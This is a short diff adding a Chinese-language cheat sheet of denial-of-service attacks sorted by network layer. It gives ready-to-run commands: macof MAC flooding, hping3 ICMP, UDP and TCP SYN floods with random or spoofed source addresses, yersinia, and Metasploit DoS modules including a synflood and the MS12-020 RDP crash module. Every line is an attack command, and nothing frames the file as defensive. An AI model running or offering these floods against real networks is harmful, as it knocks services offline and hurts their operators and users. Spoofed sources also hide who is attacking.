@@ -1,0 +1,8 @@
+拒绝服务攻击
+1数据链路层攻击macof
+2网络层攻击 hping3 -q --rand-source --id 0 --icmp -d 56 --flood ip地址
+3传输层攻击 udp攻击  hping3 -q -n -a 伪造IP地址  --udp -s 53 --keep -p 68 --flood目的IP 
+          tcp 攻击 hping3 -q -n -a 伪造IP  -S -s 53 --keep -p 22 --flood  目的IP
+
+4应用层攻击 yersinia -G 2 metaspont  dos 相关模块 use auxiliary/dos/tcp/synflood
+use auxiliary/dos/windows/rdp/ms12_020_maxchannelids
